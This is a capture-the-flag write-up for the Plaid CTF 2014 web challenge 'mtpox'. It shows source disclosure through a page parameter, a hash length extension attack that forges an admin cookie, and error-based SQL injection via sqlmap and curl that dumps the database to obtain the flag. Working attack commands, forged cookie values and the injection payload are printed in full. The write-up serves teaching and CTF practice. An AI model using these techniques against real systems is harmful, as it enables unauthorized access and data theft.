# Plaid CTF 2014: mtpox

**Category:** Web
**Points:** 150
**Description:**

> The Plague has traveled back in time to create a cryptocurrency before Satoshi does in an attempt to quickly gain the resources required for his empire. As you step out of your time machine, you learn [his exchange](http://54.211.6.40/) has stopped trades, due to some sort of bug. However, if you could break into the database and show a different story of where the coins went, we might be able to stop The Plague.
>
> Hint: try reading things using `?page=`.

## Write-up

### Source code disclosure vulnerability

The “Index” link on the website points to [`/index.php?page=index`](http://54.211.6.40/). Playing around with that URL query string parameter reveals that the site is vulnerable to source code disclosure. We exploit this vulnerability to get the source code for [`index.php`](index.php) (via [`/index.php?page=index.php`](http://54.211.6.40/index.php?page=index.php)) and [`admin.php`](admin.php) (via [`/index.php?page=admin.php`](http://54.211.6.40/index.php?page=admin.php)).

### Hash length extension vulnerability

Reading through the source code, we learn that [`admin.php`](admin.php) has some authentication logic:

```php
$auth = false;
if (isset($_COOKIE["auth"])) {
   $auth = unserialize($_COOKIE["auth"]);
   $hsh = $_COOKIE["hsh"];
   if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
     $auth = false;
   }
}
else {
  $auth = false;
  $s = serialize($auth);
  setcookie("auth", $s);
  setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
}
```

Let’s focus on the `else` clause for now, i.e. the code that is executed the first time you visit the site (without a cookie):

```php
$auth = false;
$s = serialize($auth);
setcookie("auth", $s);
setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
```

So, the value of the `auth` cookie is `serialize(false)`, and the value of the `hsh` cookie acts as a signature for it. The cookie values for any logged out users are:

```
auth=b%3A0%3B
hsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3
```

The value for `auth` makes sense, because in PHP, `false` serializes to `'b:0;`, and `true` serializes to `b:1;`:

```bash
$ php -r 'echo serialize(false);'
b:0;

$ php -r 'echo serialize(true);'
b:1;
```

We cannot simply change the value of the `auth` cookie from `b:0;` to `b:1;` to gain administrator rights, because the `hsh` cookie is used as a signature check. If the signature in `hsh` doesn’t match the `auth` value, we’re still not logged in.

After reading the source code more closely, we learn that the site is vulnerable to [hash length extension attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks). Here’s the vulnerable code in [`admin.php`](admin.php):

```php
if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
  $auth = false;
}
```

In general, an application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

Since `$_COOKIE["auth"]` and thus `strrev($_COOKIE["auth"])` are values under our control, we can use a hash length extension attack to append data to `strrev($_COOKIE["auth"])` so that `$SECRET . strrev($_COOKIE["auth"]))` generates a new hash that still matches the unknown prefix `$SECRET`. That hash can then be used as the value for the `hsh` cookie.

So, starting with the existing value for `strrev($_COOKIE["auth"])` (for which we know the signature hash), i.e. `;0:b`, what data should we append? We want to make it so that the value of the cookie is interpreted as `b:1;`, which reverses into `;1:b`.

Let’s use [HashPump](https://github.com/bwall/HashPump) to calculate the new signature. [The about page](http://54.211.6.40/index.php?page=about.php) reveals that `length($secret)` is `8`, but if we didn’t know that, we could still ‘bruteforce’ it by trying all key lengths from `1` to `32`.

```bash
$ hashpump --keylength 8 --signature 'ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3' --data ';0:b' --additional ';1:b'
967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
;0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
```

Now we have a new signature hash (`967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1`) to be used as the value for the `hsh` cookie, and the new value on which the hash is based (i.e. `strrev($_COOKIE["auth"]`) along with the `$SECRET` prefix. In order to get the `auth` cookie value, we still need to reverse and URL-encode this result:

```bash
$ node
> var data = ';0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b';
> console.log(encodeURIComponent(data.split('').reverse().join('')));
b%3A1%3B%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%80b%3A0%3B
```

Just to be sure, let’s verify that this value `unserialize`s to `true` instead of `false`:

```bash
$ php -r 'var_dump(unserialize(strrev(";0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b")));'
bool(true)
```

Looking good. Now, let’s use these cookie values and reload `admin.php`:

```
auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b
hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
```

And we’re successfully logged in!

### SQL injection vulnerability

The `query` URL parameter for [`/admin.php`](http://54.211.6.40/admin.php?query=lol) is vulnerable to SQL injection. Let’s see what kind of data we can leak using [`sqlmap`](http://sqlmap.org/):

```bash
$ sqlmap.py -u 'http://54.211.6.40/admin.php?query=abc' --cookie='auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' --dump-all

    sqlmap/0.9 - automatic SQL injection and database takeover tool
    http://sqlmap.sourceforge.net

[*] starting at: 13:33:37

[13:33:37] [INFO] using '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/session' as session file
[13:33:37] [INFO] testing connection to the target url
[13:33:37] [INFO] testing if the url is stable, wait a few seconds
[13:33:37] [INFO] url is stable
[13:33:37] [INFO] testing if GET parameter 'query' is dynamic
[13:33:37] [INFO] confirming that GET parameter 'query' is dynamic
[13:33:37] [INFO] GET parameter 'query' is dynamic
[13:33:37] [INFO] heuristic test shows that GET parameter 'query' might be injectable (possible DBMS: MySQL)
[13:33:37] [INFO] testing sql injection on GET parameter 'query'
[13:33:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:33:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:33:37] [INFO] GET parameter 'query' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
[13:33:37] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:33:37] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[13:33:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[13:33:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
GET parameter 'query' is vulnerable. Do you want to keep testing the others? [y/N] y
sqlmap identified the following injection points with a total of 33 HTTP(s) requests:
---
Place: GET
Parameter: query
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: query=abc AND (SELECT 1000 FROM(SELECT COUNT(*),CONCAT(CHAR(58,98,119,100,58),(SELECT (CASE WHEN (1000=1000) THEN 1 ELSE 0 END)),CHAR(58,108,110,101,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
---

[13:33:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian or Ubuntu
web application technology: Apache 2.2.22, PHP 5.4.4
back-end DBMS: MySQL 5.0
[13:33:37] [INFO] sqlmap will dump entries of all databases' tables now
[13:33:37] [INFO] fetching tables
[13:33:37] [INFO] fetching database names
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] the SQL query used returns 41 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: CHARACTER_SETS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATION_CHARACTER_SET_APPLICABILITY
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMNS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMN_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ENGINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: EVENTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: FILES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: KEY_COLUMN_USAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARAMETERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARTITIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PLUGINS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROCESSLIST
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROFILING
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: REFERENTIAL_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ROUTINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMATA
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMA_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: STATISTICS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLESPACES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TRIGGERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: USER_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: VIEWS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_TRX
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_POOL_STATS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCK_WAITS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCKS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE_LRU
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] retrieved: plaidcoin_wallets
[13:33:37] [INFO] fetching columns for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: id
[13:33:37] [INFO] retrieved: varchar(40)
[13:33:37] [INFO] retrieved: amount
[13:33:37] [INFO] retrieved: int(30)
[13:33:37] [INFO] fetching entries for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 1 entries
[13:33:37] [INFO] retrieved: 1333337
[13:33:37] [INFO] retrieved: flag{phpPhPphpPPPphpcoin}
Database: mtpox
Table: plaidcoin_wallets
[1 entry]
+---------+---------------------------+
| amount  | id                        |
+---------+---------------------------+
| 1333337 | flag{phpPhPphpPPPphpcoin} |
+---------+---------------------------+

[13:33:37] [INFO] Table 'mtpox.plaidcoin_wallets' dumped to CSV file '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/dump/mtpox/plaidcoin_wallets.csv'
[13:33:37] [INFO] fetching columns for table 'CHARACTER_SETS' on database 'information_schema'
[13:33:37] [INFO] the SQL query used returns 4 entries
[13:33:37] [INFO] retrieved: CHARACTER_SET_NAME
…
```

The flag is `flag{phpPhPphpPPPphpcoin}`.

For the record, the payload `sqlmap` used to get the flag was:

```bash
$ curl --cookie 'auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' 'http://54.211.6.40/admin.php?query=abc%20AND%20%28SELECT%203497%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%2C103%2C99%2C121%2C58%29%2C%28SELECT%20MID%28%28IFNULL%28CAST%28id%20AS%20CHAR%29%2CCHAR%2832%29%29%29%2C1%2C50%29%20FROM%20mtpox.plaidcoin_wallets%20LIMIT%200%2C1%29%2CCHAR%2858%2C118%2C117%2C112%2C58%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29'
Query failed: Duplicate entry ':gcy:flag{phpPhPphpPPPphpcoin}:vup:1' for key 'group_key'
```

## Other write-ups and resources

* <http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/>
* <https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack>
* <http://achatz.me/plaid-ctf-mt-pox/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/mtpox)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/mtpox/WRITEUP-arthurdent.md>
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-mtpox-web150.html)
* [Russian](http://blog.nostr.ru/2014/04/mtpox-web-150-pts-plague-has-traveled.html)
* <https://systemoverlord.com/blog/2014/04/14/plaidctf-mtpox/>
